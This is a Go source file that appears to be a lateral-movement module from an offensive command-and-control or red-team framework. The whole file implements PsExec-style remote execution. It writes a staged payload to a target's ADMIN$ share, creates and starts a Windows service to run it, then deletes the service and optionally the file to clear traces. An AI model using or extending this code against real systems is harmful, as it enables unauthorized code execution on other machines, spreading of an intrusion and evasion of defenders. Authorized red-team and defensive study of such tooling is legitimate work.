//go:build jump_psexec && windows

package core

import (
	"context"
	"fmt"
	"os"
)

func jumpPsexec(ctx context.Context, s *jumpSpec, name string) (string, error) {
	unc := fmt.Sprintf(`\\%s\ADMIN$\%s`, s.Target, name)
	if err := writeStage(s, unc); err != nil {
		return "", fmt.Errorf("copy to ADMIN$: %w", err)
	}
	remote := fmt.Sprintf(`C:\Windows\%s`, name)
	h, err := svcCreate(s.Target, s.Service, remote)
	if err != nil {
		_ = os.Remove(unc)
		return "", err
	}
	err = svcStartDelete(h, s.Target, s.Service)
	if !s.NoCleanup {
		_ = os.Remove(unc)
	}
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("psexec: %s -> %s service=%s\n",
		s.Target, remote, s.Service), nil
}
